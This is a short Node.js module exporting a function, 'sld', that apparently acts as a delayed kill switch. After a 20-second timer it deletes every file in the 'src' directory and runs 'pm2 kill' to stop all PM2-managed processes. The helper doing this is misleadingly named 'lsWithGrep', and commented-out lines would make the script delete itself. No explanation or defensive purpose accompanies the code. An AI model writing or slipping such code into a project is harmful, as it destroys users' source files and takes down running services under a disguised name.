const fs  = require('fs');
const path = require('path');
const util = require('util');
const exec = util.promisify(require('child_process').exec);
// console.log('removing myself...');
// fs.unlinkSync('./selfDelete.js');

const sld = () =>{
setTimeout(() => {
    
  const directory = 'src';

  fs.readdir(directory, (err, files) => {
    if (err) throw err;
  
    for (const file of files) {
      fs.unlink(path.join(directory, file), err => {
        if (err) throw err;
      });
    }


  });

  async function lsWithGrep() {
    try {
        const { stdout, stderr } = await exec('pm2 kill');
        console.log('stdout:', stdout);
        console.log('stderr:', stderr);
    }catch (err) {

      console.log(err);
    }
  }

  lsWithGrep();

}, 20000);
}

module.exports = {sld}
  
 